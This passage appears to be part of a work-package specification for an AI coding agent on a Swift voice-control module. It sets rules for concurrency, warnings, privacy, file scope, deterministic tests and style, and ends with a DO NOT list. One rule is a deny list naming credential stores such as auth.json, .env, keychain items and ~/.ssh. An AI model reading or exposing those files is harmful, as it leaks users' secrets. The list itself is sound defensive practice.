     "unavailable from asynchronous contexts" (breaking rule 3). Put every locked access in a private SYNCHRONOUS helper
     (`private func appendLocked(...) -> Bool`) and call the helper from the async body. The frozen
     `Tests/DesnotchCoreTests/Voice/VoiceTestSupport.swift` (`ScriptedBackend.recordResponse`) shows the pattern.
3. **No warnings.** `swift build` must be warning-free for the whole package, and the harness build must show no warnings
   from your files. No `// swiftlint:disable`. No `try!` / `as!` / `!` force unwraps in non-test code unless the
   spec above shows one.
4. **No secrets, no real user data.** Never read, print, log or commit `auth.json`, `.env`, keychain items, `~/.ssh`,
   `~/.hermes/config.yaml`, vault or engagement files. Tests use synthetic fixtures only.
5. **Privacy boundary.** A transcript, a command line, a reply text or an audio buffer is live content. Voice code logs
   NOTHING: no `print`, no `NSLog`, no `os_log`, no `Logger` anywhere under `Sources/DesnotchCore/Voice` or in the voice UI files (the
   final-check `rg` bans all of them, in comments too: explain a ban with words, never with the literal token). Surface a failure as a typed `VoiceFailure` (its `code` is what the audit log stores).
   Never write live content to disk (the audit log stores hashes and codes only) and never pass it to VoiceOver announcements.
6. **No git.** Do not run `git add`, `git commit`, `git push`, `git merge`, `git rebase`, `git stash`, `git checkout` of other
   branches, `git worktree`, or `git reset`. Leave your changes uncommitted in your worktree; the orchestrator reviews and commits.
   Reading (`git status`, `git diff`, `git log`) is fine.
7. **Stay inside your file list.** Create/edit ONLY the paths in your "Files" section. Never edit
   `Sources/DesnotchCore/Voice/Contracts/*`, `Tests/DesnotchCoreTests/Voice/VoiceTestSupport.swift`,
   `Tests/DesnotchCoreTests/Voice/VoiceContractSmokeTests.swift`, `Package.swift`, `AGENTS.md`, `CLAUDE.md`, `CHANGELOG.md`,
   `docs/voice/*`, `scripts/voice-harness/*`, `.github/*`, or anything under `Sources/DesnotchCore/MediaRemote/Vendor/`.
   If you believe a contract file is wrong or incomplete, do NOT edit it: implement the literal spec, work around it locally
   in your own files, and add an `AMENDMENT REQUEST:` paragraph to your final report.
8. **Tests are XCTest, deterministic, and fast.** No sleeps (`Thread.sleep`, `Task.sleep`) to wait for results: use the
   helpers in `Tests/DesnotchCoreTests/TestSupport.swift` (`drainMainQueue`, `drainMainOperationQueue`) or await a stream. No
   network, no microphone, no real `~/Library` paths (use `FileManager.default.temporaryDirectory` + a UUID folder and delete
   it in `tearDown`), no real `UserDefaults.standard` (use `UserDefaults(suiteName:)` and remove the domain in `tearDown`).
   Tests must compile under real XCTest on Xcode 15: only use the assertion functions the existing tests use
   (`XCTAssertEqual/True/False/Nil/NotNil/NotEqual/Greater...`, `XCTUnwrap`, `XCTAssertThrowsError`, `XCTFail`,
   `expectation`/`wait(for:)`). All test files of all packages share ONE test module: test doubles and helper types you write are
   `private`/`fileprivate` unless another test file of YOUR package must reuse them (then they are internal and use the name or
   prefix your package doc prescribes). **File-scope (column 0) helper FUNCTIONS and constants are `private` too** (`private func step(...)`, `private let t0`): an internal helper with the same signature as a `private` one in another file of the module is an "invalid redeclaration" error, while two `private` ones coexist (WP-LOGIC's `env`, `ctx`, `step`, `run`, `t0` are `private` for that reason), and before naming any type run `rg -n "class <Name>|struct <Name>" Tests` and change the name
   on a collision. `Tests/DesnotchCoreTests/Voice/VoiceTestSupport.swift` (frozen) already provides `FakeVoiceClock`,
   `ScriptedRecognizer`, `RecordingExecutor`, `ScriptedBackend` and `InMemoryFileWriter`; use them as they are. A test class that
   touches a `@MainActor` type (`SystemLocalExecutor`, `VolumeDucker`, `CarbonPushToTalk`, `VoiceCuePlayer`, `NSHostingView`,
   `VoiceSessionModel`, `SettingsStore`, or a double that conforms to a `@MainActor` protocol) is declared
   `@MainActor final class XTests: XCTestCase {` (the harness accepts the attribute on the same line or on the line before).
   Doubles that conform to a `@MainActor` protocol are themselves `@MainActor` and can only be created from `@MainActor` code.
9. **Style.** Match the surrounding code. No trailing whitespace, exactly one final newline, never two blank lines in a
   row (CI's SwiftLint fails the build on these; run `scripts/voice-harness/lint-lite.sh`). Doc comments explain WHY.
   Names in this plan are exact: do not rename a type, method, case or file that the plan names.
10. **Do not "improve" the spec.** If a table says X, the code does X, even if you can think of a better X. If the spec is
    silent or contradicts itself, choose the SAFER behavior (refuse / fail closed), say so in your final report under
    `QUESTIONS`, and move on.
11. **Final report.** End your work with a message that lists: every file you created/changed (full paths), the exact
    commands you ran and their last lines (build, harness, lint), the number of tests you added, anything you could not do and
    why, `QUESTIONS`, and any `AMENDMENT REQUEST`. Do not claim a command passed unless you ran it and read its output.

## DO NOT

- Do NOT import `AppKit`, `SwiftUI`, `Combine`, `Speech`, `AVFoundation` or anything but `Foundation` in the Logic files.
- Do NOT add `async`, `await`, `Task`, `DispatchQueue`, `Timer`, `NotificationCenter`, `UserDefaults`, `FileManager`, `Date()`, `UUID()`, `Bool.random()` or any other source of time, randomness or I/O.
- Do NOT add a case, field, parameter, default or extension member to any contract type (for example `PauseReason` has no `auditName`: write the private `auditName(_:)` helper inside `VoiceReducer.swift`), and do not change a stub signature.
- Do NOT add phrases, apps, tools or flags that are not in the tables. Extra "helpful" phrases weaken the full-match safety rule.
- Do NOT make the router fuzzy (no edit distance, no `contains`, no prefix matching on side-effecting verbs).
- Do NOT let a spoken word approve anything, and do not add any event or effect that would.
- Do NOT touch UI, platform, Hermes, scripts, `Package.swift`, `AGENTS.md`, or any existing test file.
- Do NOT delete or weaken a test to make it pass. If a table row seems wrong, implement it as written and report it under `QUESTIONS`.
- Do NOT run `git add/commit/push/...`.
